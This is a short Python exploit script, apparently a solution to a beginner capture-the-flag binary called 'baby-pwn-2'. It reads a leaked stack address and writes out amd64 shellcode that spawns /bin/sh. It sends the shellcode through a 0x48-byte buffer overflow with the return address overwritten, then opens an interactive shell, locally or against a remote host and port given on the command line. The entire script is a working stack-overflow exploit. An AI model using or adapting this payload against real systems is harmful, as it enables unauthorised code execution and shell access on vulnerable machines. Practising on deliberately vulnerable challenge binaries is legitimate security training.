#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./baby-pwn-2', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    ru(b'leak: ')
    leak = hexleak(rl())
    info('Leak: ' + hex(leak))

    shellcode = asm('''
        xor rax, rax 
        mov rax, 0x68732f6e69622f
        push rax

        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx

        mov rax, 0x3b
        syscall
        ''', arch='amd64')

    offset = 0x48
    pl = shellcode.ljust(offset, b'\0') + p64(leak)
    sla(b'Enter some text: ',pl)

    interactive()

if __name__ == '__main__':
    exploit()
